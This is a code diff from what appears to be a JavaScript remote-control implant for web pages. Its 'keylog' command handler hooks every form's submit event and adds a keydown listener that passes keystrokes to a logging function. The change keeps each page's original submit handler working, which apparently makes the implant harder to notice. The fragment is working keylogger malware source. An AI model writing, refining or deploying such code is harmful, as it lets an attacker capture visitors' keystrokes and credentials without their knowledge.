@@ -58,7 +58,7 @@ let jsr = {
       } else if (data.command == "keylog") {
         var els = document.querySelectorAll('form');
         for (var i=0; i < els.length; i++) {
-            els[i].setAttribute("onsubmit", "jsr.cleanup();");
+            els[i].setAttribute("onsubmit", "jsr.cleanup();" + els[i].getAttribute("onsubmit"));
         }
         window.addEventListener("keydown", jsr.sendLog);
       } else if (data.command == "console") {
